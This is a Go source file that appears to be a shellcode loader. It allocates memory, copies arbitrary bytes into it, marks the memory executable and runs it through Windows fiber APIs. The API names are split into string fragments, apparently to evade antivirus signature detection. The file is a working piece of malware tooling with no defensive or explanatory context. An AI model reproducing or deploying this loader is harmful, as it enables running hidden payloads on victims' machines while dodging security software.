package loader

import (
	"upx/utils"
	"unsafe"
)

const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)

func RunFib(code []byte) {
	kel32 := utils.GetWinDLL(utils.GetKe32DllName())
	nt := utils.GetWinDLL(utils.GetNtDllName())
	ViAlloc := kel32.NewProc("Vir" + "tua" + "lAl" + "loc")
	VirtProte := kel32.NewProc("Vi" + "rtu" + "alPr" + "otect")
	RtMemory := nt.NewProc("R" + "tl" + "Copy" + "Memory")
	ConvThread := kel32.NewProc("Convert" + "Thread" + "To" + "Fi" + "ber")
	CreateFi := kel32.NewProc("Create" + "Fi" + "ber")
	SwitchToFiber := kel32.NewProc("Switch" + "To" + "Fib" + "er")
	fiberAddr, _, _ := ConvThread.Call()
	addr, _, _ := ViAlloc.Call(0, uintptr(len(code)), MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtMemory.Call(addr, (uintptr)(unsafe.Pointer(&code[0])), uintptr(len(code)))
	oldProtect := PageReadwrite
	_, _, _ = VirtProte.Call(addr, uintptr(len(code)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := CreateFi.Call(0, addr, 0)
	_, _, _ = SwitchToFiber.Call(fiber)
	_, _, _ = SwitchToFiber.Call(fiberAddr)
}
